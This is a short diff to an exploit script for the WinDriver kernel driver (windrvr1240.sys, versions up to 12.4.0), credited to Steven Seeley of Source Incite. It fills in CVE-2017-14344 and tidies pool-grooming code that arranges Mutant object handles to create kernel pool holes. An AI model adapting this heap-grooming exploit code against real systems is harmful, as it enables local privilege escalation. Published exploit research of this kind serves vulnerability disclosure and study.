@@ -7,7 +7,7 @@ File:     WD1240.EXE
 Sha1:     3527cc974ec885166f0d96f6aedc8e542bb66cba
 Driver:   windrvr1240.sys
 Sha1:     0f212075d86ef7e859c1941f8e5b9e7a6f2558ad
-CVE:      CVE-2017-XXXXX
+CVE:      CVE-2017-14344
 Author:   Steven Seeley (mr_me) of Source Incite
 Affected: <= v12.4.0
 
@@ -348,11 +348,6 @@ def we_can_make_pool_holes():
             # we use 0x10 since thats the left over freed chunk from filling the page
             offset = Mutant_size + 0x10
             for i in range(offset, offset + (0xe * Mutant_size), Mutant_size):
-                #try:
-                #    # chunks need to be next to each other for the coalesce to take effect
-                #    bin.append(khandlesd[obj + i])
-                #except KeyError:
-                #    pass
 
                 if (obj + i) in khandlesd:
                     bin.append(khandlesd[obj + i])
